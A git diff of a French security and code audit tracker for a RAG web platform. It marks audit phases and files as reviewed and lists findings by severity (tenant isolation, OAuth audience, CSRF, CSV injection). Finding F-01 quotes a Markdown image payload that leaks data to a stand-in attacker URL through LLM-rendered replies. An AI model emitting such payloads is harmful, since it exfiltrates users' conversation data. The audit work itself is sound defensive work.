@@ -14,7 +14,7 @@
 
 - [x] Phase 0 — Cartographie (CLAUDE.md lus, périmètres et fichiers listés, commandes identifiées)
 - [x] Phase 1 — Baseline
-- [ ] Phase 2 — Audit fichier par fichier
+- [x] Phase 2 — Audit fichier par fichier
 - [ ] Phase 3 — Corrections et PR
 - [ ] Phase 4 — PR de clôture
 
@@ -58,10 +58,98 @@ Voir le tableau détaillé dans `AUDIT_REPORT.md`. Suivi des statuts :
 
 | ID | Sévérité | Titre | Statut |
 |---|---|---|---|
+| B-01 | Critique | `GET /workspaces/:workspaceId/onboarding/stream` prend `agentId` et `stepId` en query-string sans vérifier que | à traiter |
+| B-02 | Critique | Login Google : `OAuth2Client.getTokenInfo(accessToken)` sans vérifier l'audience (`aud`/`azp` = client id GenR | à traiter |
+| B-03 | Haute | `activate(id, agentId)` désactive les workflows de `agentId` puis `update({ where: { id } })` **sans filtrer s | à traiter |
+| B-04 | Haute | Cookie d'auth `SameSite=None` en production, aucune protection CSRF, et Express accepte `application/x-www-for | décision humaine requise |
+| B-05 | Haute | Fichier de build incrémental TypeScript commité, contenant des chemins absolus d'un poste de dev (`/home/bollo | à traiter |
+| B-06 | Haute | `@getbrevo/brevo` et `sib-api-v3-sdk` ne sont plus utilisés (Resend les remplace) mais tirent `form-data` (cri | à traiter (partiel) + décision humaine requise |
+| B-07 | Moyenne | `getModelInfo(modelId)` interpole le paramètre de route (décodé par Express : `/`, `?`, `#`, `..` possibles) d | à traiter |
+| B-08 | Moyenne | Chaque chunk du flux NDJSON est décodé isolément (`chunk.toString('utf-8')`) | à traiter |
+| B-09 | Moyenne | Pour une exception non-HTTP, `error` = l'objet exception brut sérialisé : les erreurs Prisma exposent `code`,  | à traiter |
+| B-10 | Moyenne | Export CSV des conversations : les champs (questions posées par les utilisateurs finaux) ne sont pas neutralis | à traiter |
+| B-11 | Moyenne | `PATCH /users/me` enregistre l'email tel quel (pas de `toLowerCase().trim()`), alors que login/register/reset  | à traiter (partiel) + décision humaine requise |
+| B-12 | Moyenne | `POST …/onboarding/steps-data` fusionne un objet `data` arbitraire dans `stepsData`, y compris la clé `queryCo | à traiter |
+| B-13 | Moyenne | `ThrottlerModule` est configuré mais `ThrottlerGuard` n'est pas global : seules les routes annotées sont limit | à traiter (partiel) + décision humaine requise |
+| B-15 | Moyenne | Le type MIME est celui déclaré par le client (`file.mimetype`), sans vérification du contenu (magic bytes) | décision humaine requise |
+| B-16 | Moyenne | Les documents sont identifiés auprès du moteur RAG par leur **nom** (`deleteDocument(doc.name, agentId)`, sour | décision humaine requise |
+| B-17 | Moyenne | Fichiers < 5 Mo copiés en base64 dans le payload du job BullMQ (Redis) ; `removeOnFail: false` conserve indéfi | décision humaine requise |
+| B-19 | Moyenne | Changer ou réinitialiser son mot de passe ne révoque pas les JWT existants. | décision humaine requise |
+| B-20 | Moyenne | DSN Sentry en dur, `tracesSampleRate: 1.0`, actif dans tous les environnements (dev, tests, CI) ; la variable  | décision humaine requise |
+| B-21 | Moyenne | Le playground vérifie et **débite** les crédits (`skipUsageTracking` non positionné), alors que la doc indique | décision humaine requise |
+| B-24 | Moyenne | Index manquants sur des colonnes filtrées/triées : `Conversation(agentId, userId, updatedAt)`, `Conversation(w | décision humaine requise |
+| B-29 | Moyenne | 5 tests e2e échouent (baseline) : réponse `204` attendue `200` sur `DELETE agent` (le controller a `@HttpCode( | à traiter (partiel) + décision humaine requise |
+| B-33 | Moyenne | `node:23-alpine` (version non LTS, fin de vie), `yarn install` non figé, devDependencies dans l'image, exécuti | décision humaine requise |
+| B-34 | Moyenne | Chaque workspace créé reçoit 180 crédits (plan FREE) + 20 à l'onboarding, sans limite de création. | décision humaine requise |
+| B-35 | Moyenne | Suppression d'utilisateur / workspace / agent : cascade DB, mais fichiers S3 et vecteurs du moteur RAG jamais  | décision humaine requise |
+| B-36 | Moyenne | Si le client se déconnecte en cours de flux, le flux RAG est détruit (`destroy()` sans erreur) : ni `end` ni ` | décision humaine requise |
+| B-41 | Moyenne | CI back : pas de Redis, pas de variables `AWS_*`/`RESEND_*`/`S3_BUCKET` (lues par `getOrThrow` au démarrage),  | décision humaine requise |
+| F-01 | Moyenne | Les réponses du LLM sont rendues en Markdown avec les images autorisées : `![](https://attaquant/?q=…)` est ch | à traiter |
+| F-02 | Moyenne | Redirection vers `/validate?email=${data.email}` sans `encodeURIComponent` (contrairement à `PasswordForm.tsx: | à traiter |
+| F-08 | Moyenne | Les documents Word sont prévisualisés via `view.officeapps.live.com` en lui passant l'URL présignée S3. | décision humaine requise |
+| F-10 | Moyenne | Mixpanel activé d'office (`opt_in_tracking()`) sans consentement, avec `people.set({ $name, $email })`. | décision humaine requise |
+| F-11 | Moyenne | Écrans simulés en production : achat de crédits factice (`setTimeout`, « Visa •• 4242 »), fausse clé API `sk_l | décision humaine requise |
+| F-18 | Moyenne | Outillage de dev dans `dependencies` (eslint, prettier, typescript, @types/*, testing-library) ; `motion` et ` | décision humaine requise |
+| R-02 | Moyenne | Lint front non bloquant (`continue-on-error`), pas de typecheck/build de `packages/workflow` ni de `vitrine_fr | décision humaine requise |
+| V-02 | Moyenne | TODO ouverts : liens légaux (mentions légales, confidentialité) et email de contact absents, section sécurité/ | décision humaine requise |
+| V-03 | Moyenne | Le formulaire collecte email/entreprise/fonction sans mention d'information (finalité, durée, droits). | décision humaine requise |
+| W-01 | Moyenne | Un node MODEL resté placeholder (`isPlaceholder: true`, `modelName` indéfini) n'est pas ignoré : `serializeWor | décision humaine requise |
+| W-06 | Moyenne | Aucun test, alors que `serializeWorkflow` et `sanitizeWorkflowEdges` définissent le contrat avec le moteur RAG | décision humaine requise |
+| B-14 | Basse | Assistant final : l'appel à l'API RAG est lancé **avant** la vérification que `conversationId` appartient à l' | à traiter |
+| B-18 | Basse | Hors production, BullMQ ignore `REDIS_URL` et fait `Number(REDIS_PORT)` sans défaut → `NaN` si seul `REDIS_URL | à traiter |
+| B-22 | Basse | La purge planifiée supprime des `Conversation`, la doc parle de `AgentQueryLog`. | décision humaine requise |
+| B-23 | Basse | La doc indique « un workspace démarre à 0 crédit (`POST /workspaces/:id/credit-balance`) » : le plan FREE octr | décision humaine requise |
+| B-25 | Basse | Listes non paginées : exports (toutes conversations + messages en mémoire), conversations d'un assistant, `GET | décision humaine requise |
+| B-26 | Basse | `/docs` (référence API Scalar) exposé publiquement en production. | décision humaine requise |
+| B-27 | Basse | Aucun en-tête de sécurité HTTP (`helmet`). | décision humaine requise |
+| B-28 | Basse | Chaînes sans `@MaxLength`/`@IsNotEmpty` (nom d'agent, de workspace, changelog, query de `compare`…), `definiti | décision humaine requise |
+| B-30 | Basse | Logique métier et accès Prisma directement dans un controller (contraire à la règle Controller → Service → Rep | décision humaine requise |
+| B-31 | Basse | `catch (_e: any) { throw new NotFoundException(...) }` : toute erreur (DB indisponible, contrainte) devient un | à traiter |
+| B-32 | Basse | README = boilerplate NestJS ; aucune liste des variables d'environnement hors CLAUDE.md. | à traiter |
+| B-37 | Basse | `executeQuery` (onboarding `compare`) enregistre l'usage directement dans le chemin de la requête, contraireme | décision humaine requise |
+| B-38 | Basse | `DocumentModule` importé deux fois ; JSDoc de `_getCostBreakdown` placé au-dessus d'une autre méthode ; import | à traiter |
+| B-39 | Basse | Deux endpoints de logs de requêtes (`…/runtime/query-logs` et `…/analytics/query-logs`) et deux jeux d'interfa | décision humaine requise |
+| B-40 | Basse | Toutes les règles ESLint sont rétrogradées en `warn` : `yarn lint` ne peut jamais échouer. | décision humaine requise |
+| B-42 | Basse | Verrouillage par email uniquement (5 échecs / 15 min). | décision humaine requise |
+| B-43 | Basse | Énumération de comptes : `409` à l'inscription, message explicite « aucun compte GenRAG n'existe avec l'email  | décision humaine requise |
+| B-44 | Basse | Les OTP sont hachés en HMAC avec `JWT_SECRET` (réutilisation de clé). | décision humaine requise |
+| B-45 | Basse | Toutes les routes d'onboarding sont accessibles à un VIEWER : `start` crée un agent, `complete` réécrit le wor | décision humaine requise |
+| B-46 | Basse | `timeout` axios de 120 s ne couvre que l'attente des en-têtes : un flux qui cesse d'émettre reste ouvert indéf | décision humaine requise |
+| B-47 | Basse | Mélange fuseau serveur (`getHours`, `setHours(0)`) et UTC (`toISOString`, `DATE_TRUNC` côté DB). | décision humaine requise |
+| B-48 | Basse | Pas de test pour `WorkspaceRolesGuard`, `AgentBelongsToWorkspaceGuard`, `DocumentService`, `RagEngineService`, | décision humaine requise |
+| F-03 | Basse | Suppression d'agent sans `.unwrap()` : en cas d'échec (403 VIEWER, 5xx) la modale se ferme, l'événement Mixpan | à traiter |
+| F-04 | Basse | `handleDocumentDelete` fait `.unwrap()` sans `try/catch` : rejet de promesse non géré, aucun retour utilisateu | à traiter |
+| F-05 | Basse | Navigation vers `/dashboard` et `/workspaces`, routes qui n'existent plus (cf | à traiter |
+| F-06 | Basse | `URL.revokeObjectURL` appelé immédiatement après `a.click()`. | à traiter |
+| F-07 | Basse | `executeAgentRuntime` (`POST …/runtime`) et l'URL par défaut `…/runtime/stream` n'existent pas côté back ; cod | décision humaine requise |
+| F-09 | Basse | Iframes de prévisualisation sans `sandbox` sur des fichiers déposés par les utilisateurs (dont `text/html`, cf | décision humaine requise |
+| F-12 | Basse | Route de dev publique `/test` (écran de bienvenue sans `onDone`). | décision humaine requise |
+| F-13 | Basse | Recherche et filtre par type appliqués à la seule page chargée (8 documents). | décision humaine requise |
+| F-14 | Basse | Une URL présignée demandée par carte PDF en vue grille. | décision humaine requise |
+| F-15 | Basse | Polling par `fetch()` direct (hors RTK Query, cf | décision humaine requise |
+| F-16 | Basse | Types divergents du back : `User.isEmailVerified` et `CurrentDeployment.activeWorkflow.{version,name}` ne sont | à traiter |
+| F-17 | Basse | Deux configurations ESLint divergentes ; ESLint 9 n'utilise que `.mjs`, la `.mts` est morte. | à traiter |
+| F-19 | Basse | Librairie de charts vendue (shadcn/bklit) dont une grande partie n'est pas utilisée (16 fichiers de l'app l'im | décision humaine requise |
+| F-20 | Basse | README = boilerplate CRA ; `ARCHITECTURE.md` décrit des routes supprimées (`/workspaces`, `/organisation`). | à traiter (partiel) + décision humaine requise |
+| F-21 | Basse | Écran de chargement artificiel de 800 ms à chaque ouverture de l'app. | décision humaine requise |
+| F-22 | Basse | Hook RTK choisi conditionnellement (`cond ? useGetModelsRerankQuery : useGetModelsGenerationQuery`) puis appel | décision humaine requise |
+| F-23 | Basse | La doc indique que l'app consomme `packages/workflow/dist` ; craco aliasse en fait `@genrag/workflow` vers `pa | décision humaine requise |
+| R-01 | Basse | `.gitignore` ignore `package-lock.json` (workspace yarn), mais deux lockfiles npm périmés restent suivis dans  | à traiter (partiel) + décision humaine requise |
+| R-03 | Basse | Postgres (`admin/password`), pgAdmin (`admin/admin`) et Redis (sans mot de passe) publiés sur toutes les inter | décision humaine requise |
+| R-04 | Basse | `start.sh` lance le front en arrière-plan sans jamais le tuer (`FRONT_PID` inutilisé) ; `dev.sh e2e` attend Po | décision humaine requise |
+| R-05 | Basse | La doc racine annonce `POST /rag/index (multipart file + document_id)` ; le back appelle en réalité `POST /ing | décision humaine requise |
+| R-06 | Basse | README racine réduit à une procédure de déploiement « ghost repo ». | à traiter |
+| V-01 | Basse | Le README décrit un objet `features` (statuts `available`/`soon`) qui n'existe plus dans `content.ts` (déjà si | à traiter |
+| V-04 | Basse | Ancien site Next.js conservé dans le dépôt (exclu du build/lint). | décision humaine requise |
+| W-02 | Basse | Déclaration de types manuelle obsolète (`WorkflowBuilder`, `preset`, `onDrop`… n'existent plus) | à traiter |
+| W-03 | Basse | Composant exporté mais utilisé nulle part, dont la suppression de node recrée une edge sans `sourceHandle`/`ta | à traiter |
+| W-04 | Basse | `handleAddChainNode` lit `registry` mais ne l'a pas dans ses dépendances `useCallback`. | à traiter |
+| W-05 | Basse | Peer `lucide-react ^0.500.0` (≡ `>=0.500 <0.501` en 0.x) incompatible avec la version de l'app (0.542) → avert | décision humaine requise |
+| W-07 | Basse | Listes de modèles statiques (`LLMS`, `ReRanker`) divergentes des modèles réels servis par l'API ; composants > | décision humaine requise |
 
 ## Prochaine action
 
-Phase 2 : auditer `packages/workflow` (61 fichiers).
+Phase 3 : PR 1 — `audit/back-onboarding-tenant-isolation` (B-01, Critique).
 
 ## Fichiers à auditer (Phase 2)
 
@@ -1594,304 +1682,304 @@ Hors `node_modules`, `build`, `dist`, `.venv`, `generated`, lockfiles, binaires 
 
 **packages/workflow/**
 
-- [ ] `packages/workflow/.gitignore`
-- [ ] `packages/workflow/CLAUDE.md`
-- [ ] `packages/workflow/index.d.ts`
-- [ ] `packages/workflow/package.json`
+- [x] `packages/workflow/.gitignore`
+- [x] `packages/workflow/CLAUDE.md`
+- [x] `packages/workflow/index.d.ts`
+- [x] `packages/workflow/package.json`
 
 **packages/workflow/src/**
 
-- [ ] `packages/workflow/src/components.ts`
+- [x] `packages/workflow/src/components.ts`
 
 **packages/workflow/src/components/**
 
-- [ ] `packages/workflow/src/components/BoxIcon.tsx`
-- [ ] `packages/workflow/src/components/WorkflowCanvas.tsx`
+- [x] `packages/workflow/src/components/BoxIcon.tsx`
+- [x] `packages/workflow/src/components/WorkflowCanvas.tsx`
 
 **packages/workflow/src/components/edges/**
 
-- [ ] `packages/workflow/src/components/edges/GenEdge.tsx`
-- [ ] `packages/workflow/src/components/edges/SettingsEdge.tsx`
-- [ ] `packages/workflow/src/components/edges/edge-animations.css`
-- [ ] `packages/workflow/src/components/edges/index.ts`
+- [x] `packages/workflow/src/components/edges/GenEdge.tsx`
+- [x] `packages/workflow/src/components/edges/SettingsEdge.tsx`
+- [x] `packages/workflow/src/components/edges/edge-animations.css`
+- [x] `packages/workflow/src/components/edges/index.ts`
 
 **packages/workflow/src/components/**
 
-- [ ] `packages/workflow/src/components/index.ts`
+- [x] `packages/workflow/src/components/index.ts`
 
 **packages/workflow/src/components/nodes/**
 
-- [ ] `packages/workflow/src/components/nodes/Common.tsx`
-- [ ] `packages/workflow/src/components/nodes/NodeCard.tsx`
-- [ ] `packages/workflow/src/components/nodes/NodeComponent.tsx`
-- [ ] `packages/workflow/src/components/nodes/NodeHeader.tsx`
-- [ ] `packages/workflow/src/components/nodes/NodeInputs.tsx`
-- [ ] `packages/workflow/src/components/nodes/NodeOutputs.tsx`
-- [ ] `packages/workflow/src/components/nodes/NodeShape.tsx`
+- [x] `packages/workflow/src/components/nodes/Common.tsx`
+- [x] `packages/workflow/src/components/nodes/NodeCard.tsx`
+- [x] `packages/workflow/src/components/nodes/NodeComponent.tsx`
+- [x] `packages/workflow/src/components/nodes/NodeHeader.tsx`
+- [x] `packages/workflow/src/components/nodes/NodeInputs.tsx`
+- [x] `packages/workflow/src/components/nodes/NodeOutputs.tsx`
+- [x] `packages/workflow/src/components/nodes/NodeShape.tsx`
 
 **packages/workflow/src/components/nodes/SettingNodes/**
 
-- [ ] `packages/workflow/src/components/nodes/SettingNodes/InstructionNode.tsx`
-- [ ] `packages/workflow/src/components/nodes/SettingNodes/ModelNode.tsx`
+- [x] `packages/workflow/src/components/nodes/SettingNodes/InstructionNode.tsx`
+- [x] `packages/workflow/src/components/nodes/SettingNodes/ModelNode.tsx`
 
 **packages/workflow/src/components/nodes/**
 
-- [ ] `packages/workflow/src/components/nodes/index.ts`
+- [x] `packages/workflow/src/components/nodes/index.ts`
 
 **packages/workflow/src/**
 
-- [ ] `packages/workflow/src/edges.ts`
-- [ ] `packages/workflow/src/graph.ts`
+- [x] `packages/workflow/src/edges.ts`
+- [x] `packages/workflow/src/graph.ts`
 
 **packages/workflow/src/graph/**
 
-- [ ] `packages/workflow/src/graph/create-flow-node.ts`
-- [ ] `packages/workflow/src/graph/index.ts`
-- [ ] `packages/workflow/src/graph/task-utils.ts`
+- [x] `packages/workflow/src/graph/create-flow-node.ts`
+- [x] `packages/workflow/src/graph/index.ts`
+- [x] `packages/workflow/src/graph/task-utils.ts`
 
 **packages/workflow/src/graph/task/**
 
-- [ ] `packages/workflow/src/graph/task/add-database.tsx`
-- [ ] `packages/workflow/src/graph/task/add-instruction.tsx`
-- [ ] `packages/workflow/src/graph/task/add-model.tsx`
-- [ ] `packages/workflow/src/graph/task/add-query.tsx`
-- [ ] `packages/workflow/src/graph/task/add-reranking.tsx`
-- [ ] `packages/workflow/src/graph/task/add-response.tsx`
-- [ ] `packages/workflow/src/graph/task/add-rewriter.tsx`
-- [ ] `packages/workflow/src/graph/task/registry.tsx`
+- [x] `packages/workflow/src/graph/task/add-database.tsx`
+- [x] `packages/workflow/src/graph/task/add-instruction.tsx`
+- [x] `packages/workflow/src/graph/task/add-model.tsx`
+- [x] `packages/workflow/src/graph/task/add-query.tsx`
+- [x] `packages/workflow/src/graph/task/add-reranking.tsx`
+- [x] `packages/workflow/src/graph/task/add-response.tsx`
+- [x] `packages/workflow/src/graph/task/add-rewriter.tsx`
+- [x] `packages/workflow/src/graph/task/registry.tsx`
 
 **packages/workflow/src/**
 
-- [ ] `packages/workflow/src/hooks.ts`
+- [x] `packages/workflow/src/hooks.ts`
 
 **packages/workflow/src/hooks/**
 
-- [ ] `packages/workflow/src/hooks/index.ts`
-- [ ] `packages/workflow/src/hooks/useAppResponsive.ts`
-- [ ] `packages/workflow/src/hooks/useCenterNodePosition.ts`
-- [ ] `packages/workflow/src/hooks/useFixNodePosition.tsx`
-- [ ] `packages/workflow/src/hooks/useFlowTypes.tsx`
-- [ ] `packages/workflow/src/hooks/useNodeInformation.ts`
-- [ ] `packages/workflow/src/hooks/useNodeSelection.ts`
-- [ ] `packages/workflow/src/hooks/useWorkflowCanvas.ts`
-- [ ] `packages/workflow/src/hooks/useWorkflowNodes.ts`
+- [x] `packages/workflow/src/hooks/index.ts`
+- [x] `packages/workflow/src/hooks/useAppResponsive.ts`
+- [x] `packages/workflow/src/hooks/useCenterNodePosition.ts`
+- [x] `packages/workflow/src/hooks/useFixNodePosition.tsx`
+- [x] `packages/workflow/src/hooks/useFlowTypes.tsx`
+- [x] `packages/workflow/src/hooks/useNodeInformation.ts`
+- [x] `packages/workflow/src/hooks/useNodeSelection.ts`
+- [x] `packages/workflow/src/hooks/useWorkflowCanvas.ts`
+- [x] `packages/workflow/src/hooks/useWorkflowNodes.ts`
 
 **packages/workflow/src/**
 
-- [ ] `packages/workflow/src/index.ts`
+- [x] `packages/workflow/src/index.ts`
 
 **packages/workflow/src/layout/**
 
-- [ ] `packages/workflow/src/layout/dagre.ts`
-- [ ] `packages/workflow/src/layout/horizontal.ts`
-- [ ] `packages/workflow/src/layout/index.ts`
-- [ ] `packages/workflow/src/layout/types.ts`
-- [ ] `packages/workflow/src/layout/vertical.ts`
+- [x] `packages/workflow/src/layout/dagre.ts`
+- [x] `packages/workflow/src/layout/horizontal.ts`
+- [x] `packages/workflow/src/layout/index.ts`
+- [x] `packages/workflow/src/layout/types.ts`
+- [x] `packages/workflow/src/layout/vertical.ts`
 
 **packages/workflow/src/**
 
-- [ ] `packages/workflow/src/nodes.ts`
-- [ ] `packages/workflow/src/types.ts`
+- [x] `packages/workflow/src/nodes.ts`
+- [x] `packages/workflow/src/types.ts`
 
 **packages/workflow/src/types/**
 
-- [ ] `packages/workflow/src/types/app-node.ts`
-- [ ] `packages/workflow/src/types/edge.ts`
-- [ ] `packages/workflow/src/types/index.ts`
-- [ ] `packages/workflow/src/types/model-option.ts`
-- [ ] `packages/workflow/src/types/task.ts`
+- [x] `packages/workflow/src/types/app-node.ts`
+- [x] `packages/workflow/src/types/edge.ts`
+- [x] `packages/workflow/src/types/index.ts`
+- [x] `packages/workflow/src/types/model-option.ts`
+- [x] `packages/workflow/src/types/task.ts`
 
 **packages/workflow/src/utils/**
 
-- [ ] `packages/workflow/src/utils/sanitize.ts`
-- [ ] `packages/workflow/src/utils/serialize.ts`
+- [x] `packages/workflow/src/utils/sanitize.ts`
+- [x] `packages/workflow/src/utils/serialize.ts`
 
 **packages/workflow/**
 
-- [ ] `packages/workflow/tsconfig.json`
+- [x] `packages/workflow/tsconfig.json`
 
 ### Périmètre `vitrine_front` (102 fichiers)
 
 
 **vitrine_front/**
 
-- [ ] `vitrine_front/.env.example`
-- [ ] `vitrine_front/.gitignore`
-- [ ] `vitrine_front/.prettierrc`
-- [ ] `vitrine_front/CLAUDE.md`
-- [ ] `vitrine_front/README.md`
+- [x] `vitrine_front/.env.example`
+- [x] `vitrine_front/.gitignore`
+- [x] `vitrine_front/.prettierrc`
+- [x] `vitrine_front/CLAUDE.md`
+- [x] `vitrine_front/README.md`
 
 **vitrine_front/_archive/**
 
-- [ ] `vitrine_front/_archive/.gitignore`
-- [ ] `vitrine_front/_archive/Dockerfile`
-- [ ] `vitrine_front/_archive/README.md`
+- [x] `vitrine_front/_archive/.gitignore`
+- [x] `vitrine_front/_archive/Dockerfile`
+- [x] `vitrine_front/_archive/README.md`
 
 **vitrine_front/_archive/app/**
 
-- [ ] `vitrine_front/_archive/app/globals.css`
-- [ ] `vitrine_front/_archive/app/layout.tsx`
-- [ ] `vitrine_front/_archive/app/page.tsx`
-- [ ] `vitrine_front/_archive/app/providers.tsx`
+- [x] `vitrine_front/_archive/app/globals.css`
+- [x] `vitrine_front/_archive/app/layout.tsx`
+- [x] `vitrine_front/_archive/app/page.tsx`
+- [x] `vitrine_front/_archive/app/providers.tsx`
 
 **vitrine_front/_archive/**
 
-- [ ] `vitrine_front/_archive/components.json`
+- [x] `vitrine_front/_archive/components.json`
 
 **vitrine_front/_archive/components/**
 
-- [ ] `vitrine_front/_archive/components/ChatSimulationPanel.tsx`
-- [ ] `vitrine_front/_archive/components/FeaturesBentoSection.tsx`
-- [ ] `vitrine_front/_archive/components/ModelCompatibilityStrip.tsx`
-- [ ] `vitrine_front/_archive/components/SiteFooter.tsx`
-- [ ] `vitrine_front/_archive/components/WorkflowPackagePreview.tsx`
+- [x] `vitrine_front/_archive/components/ChatSimulationPanel.tsx`
+- [x] `vitrine_front/_archive/components/FeaturesBentoSection.tsx`
+- [x] `vitrine_front/_archive/components/ModelCompatibilityStrip.tsx`
+- [x] `vitrine_front/_archive/components/SiteFooter.tsx`
+- [x] `vitrine_front/_archive/components/WorkflowPackagePreview.tsx`
 
 **vitrine_front/_archive/components/ui/**
 
-- [ ] `vitrine_front/_archive/components/ui/animatedGradiantBorder.tsx`
-- [ ] `vitrine_front/_archive/components/ui/animatedSplineBorder.tsx`
-- [ ] `vitrine_front/_archive/components/ui/input.tsx`
-- [ ] `vitrine_front/_archive/components/ui/label.tsx`
+- [x] `vitrine_front/_archive/components/ui/animatedGradiantBorder.tsx`
+- [x] `vitrine_front/_archive/components/ui/animatedSplineBorder.tsx`
+- [x] `vitrine_front/_archive/components/ui/input.tsx`
+- [x] `vitrine_front/_archive/components/ui/label.tsx`
 
 **vitrine_front/_archive/**
 
-- [ ] `vitrine_front/_archive/eslint.config.mjs`
+- [x] `vitrine_front/_archive/eslint.config.mjs`
 
 **vitrine_front/_archive/lib/**
 
-- [ ] `vitrine_front/_archive/lib/utils.ts`
+- [x] `vitrine_front/_archive/lib/utils.ts`
 
 **vitrine_front/_archive/**
 
-- [ ] `vitrine_front/_archive/next.config.ts`
-- [ ] `vitrine_front/_archive/package.json`
-- [ ] `vitrine_front/_archive/postcss.config.mjs`
-- [ ] `vitrine_front/_archive/tsconfig.json`
+- [x] `vitrine_front/_archive/next.config.ts`
+- [x] `vitrine_front/_archive/package.json`
+- [x] `vitrine_front/_archive/postcss.config.mjs`
+- [x] `vitrine_front/_archive/tsconfig.json`
 
 **vitrine_front/**
 
-- [ ] `vitrine_front/eslint.config.js`
-- [ ] `vitrine_front/index.html`
-- [ ] `vitrine_front/package.json`
+- [x] `vitrine_front/eslint.config.js`
+- [x] `vitrine_front/index.html`
+- [x] `vitrine_front/package.json`
 
 **vitrine_front/public/**
 
-- [ ] `vitrine_front/public/robots.txt`
+- [x] `vitrine_front/public/robots.txt`
 
 **vitrine_front/scripts/**
 
-- [ ] `vitrine_front/scripts/shots.mjs`
+- [x] `vitrine_front/scripts/shots.mjs`
 
 **vitrine_front/src/**
 
-- [ ] `vitrine_front/src/App.tsx`
+- [x] `vitrine_front/src/App.tsx`
 
 **vitrine_front/src/components/**
 
-- [ ] `vitrine_front/src/components/Chrome.module.css`
-- [ ] `vitrine_front/src/components/Chrome.tsx`
-- [ ] `vitrine_front/src/components/DemoCursor.module.css`
-- [ ] `vitrine_front/src/components/DemoCursor.tsx`
-- [ ] `vitrine_front/src/components/Logo.tsx`
-- [ ] `vitrine_front/src/components/Panel.module.css`
-- [ ] `vitrine_front/src/components/Panel.tsx`
-- [ ] `vitrine_front/src/components/icoFaces.ts`
-- [ ] `vitrine_front/src/components/reveal.ts`
-- [ ] `vitrine_front/src/components/ui.module.css`
-- [ ] `vitrine_front/src/components/ui.tsx`
+- [x] `vitrine_front/src/components/Chrome.module.css`
+- [x] `vitrine_front/src/components/Chrome.tsx`
+- [x] `vitrine_front/src/components/DemoCursor.module.css`
+- [x] `vitrine_front/src/components/DemoCursor.tsx`
+- [x] `vitrine_front/src/components/Logo.tsx`
+- [x] `vitrine_front/src/components/Panel.module.css`
+- [x] `vitrine_front/src/components/Panel.tsx`
+- [x] `vitrine_front/src/components/icoFaces.ts`
+- [x] `vitrine_front/src/components/reveal.ts`
+- [x] `vitrine_front/src/components/ui.module.css`
+- [x] `vitrine_front/src/components/ui.tsx`
 
 **vitrine_front/src/**
 
-- [ ] `vitrine_front/src/content.ts`
-- [ ] `vitrine_front/src/main.tsx`
+- [x] `vitrine_front/src/content.ts`
+- [x] `vitrine_front/src/main.tsx`
 
 **vitrine_front/src/mockups/**
 
-- [ ] `vitrine_front/src/mockups/AppSidebar.module.css`
-- [ ] `vitrine_front/src/mockups/AppSidebar.tsx`
-- [ ] `vitrine_front/src/mockups/BuilderCanvas.module.css`
-- [ ] `vitrine_front/src/mockups/BuilderCanvas.tsx`
-- [ ] `vitrine_front/src/mockups/builderGraph.ts`
+- [x] `vitrine_front/src/mockups/AppSidebar.module.css`
+- [x] `vitrine_front/src/mockups/AppSidebar.tsx`
+- [x] `vitrine_front/src/mockups/BuilderCanvas.module.css`
+- [x] `vitrine_front/src/mockups/BuilderCanvas.tsx`
+- [x] `vitrine_front/src/mockups/builderGraph.ts`
 
 **vitrine_front/src/motion/**
 
-- [ ] `vitrine_front/src/motion/MotionContext.tsx`
-- [ ] `vitrine_front/src/motion/reduced.ts`
-- [ ] `vitrine_front/src/motion/scrubs.ts`
-- [ ] `vitrine_front/src/motion/stage.ts`
-- [ ] `vitrine_front/src/motion/store.ts`
+- [x] `vitrine_front/src/motion/MotionContext.tsx`
+- [x] `vitrine_front/src/motion/reduced.ts`
+- [x] `vitrine_front/src/motion/scrubs.ts`
+- [x] `vitrine_front/src/motion/stage.ts`
+- [x] `vitrine_front/src/motion/store.ts`
 
 **vitrine_front/src/sections/**
 
-- [ ] `vitrine_front/src/sections/Analytics.module.css`
-- [ ] `vitrine_front/src/sections/Analytics.tsx`
-- [ ] `vitrine_front/src/sections/Assistants.module.css`
-- [ ] `vitrine_front/src/sections/Assistants.tsx`
-- [ ] `vitrine_front/src/sections/Builder.module.css`
-- [ ] `vitrine_front/src/sections/Builder.tsx`
-- [ ] `vitrine_front/src/sections/Connectors.module.css`
-- [ ] `vitrine_front/src/sections/Connectors.tsx`
-- [ ] `vitrine_front/src/sections/Contact.module.css`
-- [ ] `vitrine_front/src/sections/Contact.tsx`
-- [ ] `vitrine_front/src/sections/Footer.module.css`
-- [ ] `vitrine_front/src/sections/Footer.tsx`
-- [ ] `vitrine_front/src/sections/Hero.module.css`
-- [ ] `vitrine_front/src/sections/Hero.tsx`
-- [ ] `vitrine_front/src/sections/Problem.module.css`
-- [ ] `vitrine_front/src/sections/Problem.tsx`
-- [ ] `vitrine_front/src/sections/Share.module.css`
-- [ ] `vitrine_front/src/sections/Share.tsx`
-- [ ] `vitrine_front/src/sections/Steps.module.css`
-- [ ] `vitrine_front/src/sections/Steps.tsx`
-- [ ] `vitrine_front/src/sections/Why.module.css`
-- [ ] `vitrine_front/src/sections/Why.tsx`
+- [x] `vitrine_front/src/sections/Analytics.module.css`
+- [x] `vitrine_front/src/sections/Analytics.tsx`
+- [x] `vitrine_front/src/sections/Assistants.module.css`
+- [x] `vitrine_front/src/sections/Assistants.tsx`
+- [x] `vitrine_front/src/sections/Builder.module.css`
+- [x] `vitrine_front/src/sections/Builder.tsx`
+- [x] `vitrine_front/src/sections/Connectors.module.css`
+- [x] `vitrine_front/src/sections/Connectors.tsx`
+- [x] `vitrine_front/src/sections/Contact.module.css`
+- [x] `vitrine_front/src/sections/Contact.tsx`
+- [x] `vitrine_front/src/sections/Footer.module.css`
+- [x] `vitrine_front/src/sections/Footer.tsx`
+- [x] `vitrine_front/src/sections/Hero.module.css`
+- [x] `vitrine_front/src/sections/Hero.tsx`
+- [x] `vitrine_front/src/sections/Problem.module.css`
+- [x] `vitrine_front/src/sections/Problem.tsx`
+- [x] `vitrine_front/src/sections/Share.module.css`
+- [x] `vitrine_front/src/sections/Share.tsx`
+- [x] `vitrine_front/src/sections/Steps.module.css`
+- [x] `vitrine_front/src/sections/Steps.tsx`
+- [x] `vitrine_front/src/sections/Why.module.css`
+- [x] `vitrine_front/src/sections/Why.tsx`
 
 **vitrine_front/src/sections/builder/**
 
-- [ ] `vitrine_front/src/sections/builder/BlockOverview.module.css`
-- [ ] `vitrine_front/src/sections/builder/BlockOverview.tsx`
-- [ ] `vitrine_front/src/sections/builder/ModelPicker.module.css`
-- [ ] `vitrine_front/src/sections/builder/ModelPicker.tsx`
-- [ ] `vitrine_front/src/sections/builder/NodePalette.module.css`
-- [ ] `vitrine_front/src/sections/builder/NodePalette.tsx`
